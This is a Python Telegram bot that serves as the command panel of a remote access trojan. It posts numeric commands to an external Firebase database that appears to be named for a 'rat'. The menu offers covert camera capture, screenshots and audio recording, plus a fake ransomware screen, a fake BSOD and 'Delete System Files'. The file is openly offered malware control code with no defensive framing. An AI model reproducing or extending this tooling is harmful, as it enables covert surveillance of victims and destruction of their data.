from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import ApplicationBuilder, CommandHandler, CallbackQueryHandler, ContextTypes
import requests

TOKEN = "Token her"
FIREBASE_URL = "https://rat-vm-11c62-default-rtdb.firebaseio.com/commands.json"

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    keyboard = [
        [InlineKeyboardButton("Shutdown", callback_data="1")],
        [InlineKeyboardButton("Restart", callback_data="2")],
        [InlineKeyboardButton("Lock Screen (Mr Robot)", callback_data="3")],
        [InlineKeyboardButton("Fake BSOD", callback_data="4")],
        [InlineKeyboardButton("Capture Camera", callback_data="5")],
        [InlineKeyboardButton("Take Screenshot", callback_data="6")],
        [InlineKeyboardButton("Change Wallpaper to Red", callback_data="7")],
        [InlineKeyboardButton("Record Audio", callback_data="8")],
        [InlineKeyboardButton("Fake Ransomware", callback_data="9")],
        [InlineKeyboardButton("Delete System Files", callback_data="10")]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    await update.message.reply_text("Welcome! Choose a command:", reply_markup=reply_markup)

async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    command = query.data
    try:
        res = requests.post(FIREBASE_URL, json={"command": command})
        if res.status_code == 200:
            await query.edit_message_text(text="Command sent successfully.")
        else:
            await query.edit_message_text(text="Failed to send command.")
    except Exception as e:
        await query.edit_message_text(text=f"Error: {e}")

def main():
    app = ApplicationBuilder().token(TOKEN).build()
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CallbackQueryHandler(button_handler))
    app.run_polling()

if __name__ == "__main__":
    main()